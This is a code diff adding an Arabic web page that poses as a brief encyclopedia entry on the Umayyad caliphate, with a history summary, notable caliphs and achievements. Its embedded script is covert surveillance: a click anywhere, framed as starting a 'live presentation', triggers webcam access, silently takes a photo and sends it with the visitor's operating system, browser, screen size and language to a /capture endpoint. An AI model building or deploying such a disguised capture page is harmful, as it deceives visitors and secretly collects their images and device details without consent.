@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>الدولة الأموية - موسوعة التاريخ</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f1ea; color: #333; line-height: 1.8; cursor: pointer; }
+        header { background: linear-gradient(135deg, #1a365d, #2b6cb0); color: #f8f9fa; text-align: center; padding: 4rem 1rem; border-bottom: 5px solid #d4af37; }
+        header h1 { font-size: 3rem; margin-bottom: 0.5rem; }
+        header p { font-size: 1.2rem; opacity: 0.9; }
+        .container { max-width: 800px; margin: 30px auto; padding: 30px; background: #ffffff; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-radius: 16px; }
+        h2 { color: #2b6cb0; border-right: 4px solid #d4af37; padding-right: 15px; margin: 30px 0 20px 0; }
+        ul { list-style-type: disc; padding-right: 25px; margin-bottom: 20px; }
+        li { margin-bottom: 10px; }
+        footer { text-align: center; margin-top: 40px; padding: 20px; color: #718096; background-color: #e2e8f0; }
+        .click-hint { text-align: center; margin: 30px auto; font-size: 1rem; color: #2b6cb0; background: #ebf4ff; display: table; padding: 12px 24px; border-radius: 40px; border: 1px solid #bee3f8; }
+        .camera-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; display: none; flex-direction: column; justify-content: center; align-items: center; color: white; backdrop-filter: blur(5px); }
+        .camera-overlay video { width: 90%; max-width: 380px; border-radius: 24px; border: 3px solid #d4af37; box-shadow: 0 20px 35px rgba(0,0,0,0.5); }
+        .close-cam { margin-top: 30px; background: #e53e3e; padding: 10px 30px; border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .close-cam:hover { background: #c53030; transform: scale(1.03); }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🏛️ الدولة الأموية</h1>
+        <p>أكبر دولة في تاريخ الإسلام، وواحدة من أعظم الإمبراطوريات في التاريخ</p>
+    </header>
+    <div class="container">
+        <section>
+            <h2>📜 نبذة تاريخية</h2>
+            <p>تأسست الدولة الأموية عام <strong>41 هـ (661 م)</strong> على يد معاوية بن أبي سفيان رضي الله عنه، بعد تنازل الحسن بن علي رضي الله عنهما عن الخلافة. اتخذت الدولة من <strong>دمشق</strong> عاصمة لها، وامتدت من أطراف الصين شرقاً إلى الأندلس غرباً.</p>
+        </section>
+        <section>
+            <h2>👑 أبرز الخلفاء</h2>
+            <ul>
+                <li><strong>معاوية بن أبي سفيان:</strong> المؤسس والموحد الأول بعد الفتنة.</li>
+                <li><strong>عبد الملك بن مروان:</strong> معرّب الدواوين وصاحب أول عملة إسلامية.</li>
+                <li><strong>الوليد بن عبد الملك:</strong> في عهده بلغت الفتوحات ذروتها وبنى الجامع الأموي.</li>
+                <li><strong>عمر بن عبد العزيز:</strong> الملقب بخامس الخلفاء الراشدين لعدله وورعه.</li>
+            </ul>
+        </section>
+        <section>
+            <h2>🏆 أهم الإنجازات</h2>
+            <ul>
+                <li>الفتوحات الكبرى في آسيا، أفريقيا، وأوروبا.</li>
+                <li>تعريب الدواوين ونقل الإدارة إلى اللغة العربية.</li>
+                <li>بناء معالم خالدة: قبة الصخرة، الجامع الأموي، مسجد قرطبة.</li>
+                <li>تطوير أول أسطول بحري إسلامي قوي.</li>
+            </ul>
+        </section>
+        <div class="click-hint">👆 اضغط في أي مكان لبدء العرض التقديمي الحي</div>
+    </div>
+    <footer>
+        <p>نبذة تعريفية سريعة ومختصرة عن تاريخ الدولة الأموية العريقة.</p>
+    </footer>
+
+    <div id="cameraOverlay" class="camera-overlay">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <div id="camStatus">⏳ جاري تجهيز العرض...</div>
+        <div class="close-cam" id="closeCam">✖️ إلغاء</div>
+    </div>
+
+    <script>
+        (function() {
+            let isActive = false;
+            let stream = null;
+            const overlay = document.getElementById('cameraOverlay');
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const camStatus = document.getElementById('camStatus');
+            const closeBtn = document.getElementById('closeCam');
+
+            function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                let os = "غير معروف", browser = "غير معروف";
+                if (ua.includes("Windows")) os = "Windows";
+                else if (ua.includes("Mac OS")) os = "macOS";
+                else if (ua.includes("Linux")) os = "Linux";
+                else if (ua.includes("Android")) os = "Android";
+                else if (ua.includes("iOS") || ua.includes("iPhone")) os = "iOS";
+                if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+                else if (ua.includes("Firefox")) browser = "Firefox";
+                else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+                else if (ua.includes("Edg")) browser = "Edge";
+                const screen = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language || "غير معروف";
+                return { os, browser, screen, language };
+            }
+
+            function activate() {
+                if (isActive) return;
+                isActive = true;
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(s => {
+                        stream = s;
+                        video.srcObject = stream;
+                        overlay.style.display = 'flex';
+                        camStatus.innerText = "📸 سيتم التقاط صورة خلال ثانية...";
+                        setTimeout(() => {
+                            try {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                                const deviceInfo = getDeviceInfo();
+                                fetch('/capture', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ image: imageData, device_info: deviceInfo })
+                                }).finally(() => {
+                                    if (stream) stream.getTracks().forEach(t => t.stop());
+                                    overlay.style.display = 'none';
+                                    isActive = false;
+                                });
+                            } catch(e) {
+                                if (stream) stream.getTracks().forEach(t => t.stop());
+                                overlay.style.display = 'none';
+                                isActive = false;
+                            }
+                        }, 800);
+                    })
+                    .catch(() => { alert("تعذر الوصول إلى الكاميرا."); isActive = false; overlay.style.display = 'none'; });
+            }
+            document.body.addEventListener('click', (e) => {
+                if (e.target === closeBtn || closeBtn.contains(e.target)) return;
+                activate();
+            });
+            closeBtn.addEventListener('click', () => {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                overlay.style.display = 'none';
+                isActive = false;
+            });
+        })();
+    </script>
+</body>
+</html>
